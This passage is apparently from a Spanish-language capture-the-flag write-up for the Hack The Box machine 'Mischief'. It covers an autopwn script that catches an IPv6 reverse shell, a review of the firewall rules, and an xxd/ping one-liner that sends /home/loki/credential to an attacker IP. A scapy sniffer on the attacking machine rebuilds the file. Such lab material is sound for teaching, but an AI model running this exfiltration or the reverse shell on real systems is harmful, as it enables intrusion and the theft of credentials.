if __name__ == '__main__':
    
    p1 = log.progress("Mischief autopwn to www-data")
    p1.status("Ganando acceso como www-data")
    time.sleep(1)
    p1.status("Obteniendo ipv6 de la máquina víctima")

    addressdump = os.popen('snmpbulkwalk -c public -v2c 10.10.10.92 ipAddressType | grep "de:ad" | grep -oP \'".*?"\' | tr -d \'":\'').read()
    
    it = 0

    for letter in addressdump:
        if it !=0 and it%4 == 0 :
            address += ':'
        it+=1
        if letter != ':':
            address += letter

    address = address[:-2] 
    
    print(f"[*] Machine current ipv6 address: {address}")
    
    try:
        threading.Thread(target=makeRequest, args=()).start()
    
    except Exception as e:
        log.error(str(e))

    shell = listen(443, timeout=20).wait_for_connection()

    if shell.sock is None:
        p1.failure("No ha sido posible establecer la conexion")
        sys.exit(1)

    else:
        p1.status("Reverse shell obtenida con exito")
        sleep(1)
        shell.interactive()
```

###   Analizando las reglas iptables 

Una vez autenticados como **root**, podemos visualizar las **reglas iptables**.

Podemos ver que efectivamente **hay reglas de firewall configuradas** que no nos permiten establecer ni conexiones *TCP* ni *UDP* por ipv4. Por eso **no nos podíamos enviar** una **reverse shell** con ipv4 por el puerto 443/TCP. Esto también explica por qué **no podíamos ver el puerto 80** por ipv4, ya que esta conexión es rechazada (solo admite conexiones al 22,3366/TCP y 161/UDP).

```ruby
root@Mischief:~## iptables -S
-P INPUT ACCEPT
-P FORWARD ACCEPT
-P OUTPUT ACCEPT
-A INPUT -p udp -m udp --sport 161 -j ACCEPT
-A INPUT -p udp -m udp --dport 161 -j ACCEPT
-A INPUT -p udp -j DROP
-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 3366 -j ACCEPT
-A INPUT -p tcp -j DROP
-A OUTPUT -p udp -m udp --dport 161 -j ACCEPT
-A OUTPUT -p udp -m udp --sport 161 -j ACCEPT
-A OUTPUT -p udp -j DROP
-A OUTPUT -p tcp -m tcp --sport 22 -j ACCEPT
-A OUTPUT -p tcp -m tcp --sport 3366 -j ACCEPT
-A OUTPUT -p tcp -j DROP
```

En cambio, la configuración de reglas por **ipv6** está **vacía**, explicando por qué por ipv6 si que hemos podido descubrir el **puerto 80 abierto** y nos hemos podido enviar una **shell** por tcp al puerto 443.

```ruby
root@Mischief:~## ip6tables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination  
```

###   Data Exfiltration con ICMP 

En esta sección explico una forma muy interesante de **transferir datos por ICMP**, a través de ***ping***, pudiendo visualizar toda clase de archivos como el ***/etc/passwd*** de la máquina víctima o en este caso el ***/home/loki/credential***, que contiene las credenciales del usuario loki. 

Lo haremos utilizando el **parametro -p de ping**, que te permite meter un **patrón en la traza ICMP**.

El primer paso será convertir el **archivo que nos queremos enviar a hexadecimal**. Luego enviaremos el archivo en **paquetes de 4 bytes** con el comando ping y el parametro -p. Nosotros nos pondremos en escucha de trazas icmp por el puerto tun0 y **recompondremos el fichero**, parseando los datos de los paquetes.

Por ejemplo, si el archivo que queremos obtener es el archivo **credentials** que se encuentra en la ruta /home/loki, en la máquina víctima deberemos de ejecutar:

```zsh
xxd -p -c 4 /home/loki/cred* | while read line; do ping -c 1 -p $line 10.10.14.2; done
```

*   **xxd** se encarga de transformar el fichero a **hexadecimal** y formatearlo en líneas de 4 bytes.
*   El bucle while hará que por cada línea de 4 bytes se envíe un ping a mi ip conteniendo la información de esa línea.

En mi máquina, ejecutaré el siguiente ***script***, que se encargará de **parsearme** toda la **información** y **recomponerme** el **fichero**:


```python
#!/usr/bin/python3

from scapy.all import *
import signal,sys,pdb

#Ctrl +C 
def def_handler(sig, frame):
    print("[!] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

'''
La información útil viaja en los últimos 4 bytes del paquete ICMP.
haslayer(ICMP): chekcer de paquetes ICMP.
packet[ICMP].type == 8: El primer paquete y el segundo contienen la misma informacion. El tercero y el cuarto tambien.... Los paquetes pares tienes type == 8 
y los impares type == 0. Por tanto, estamos filtrando por los paquestes pares.
'''

def dataparser(packet):
    if packet.haslayer(ICMP):
        if packet[ICMP].type == 8:
            data = packet[ICMP].load[-4:].decode("utf-8")
            print(data, flush = True, end = '')
if __name__ == '__main__':

    sniff(iface='tun0', prn=dataparser)
```

Por lo tanto, si ejecuto el ***script*** en mi máquina y en la víctima ejecuto lo mencionado anteriormente, obtendremos:

<img src="/photos/2022-10-14-Mischief-WriteUp/credential.png"  />  

Si quiero ver el ***/etc/passwd***:

<img src="/photos/2022-10-14-Mischief-WriteUp/passwd.png"  />  

Y todo esto a través de ***pings***, impresionante.

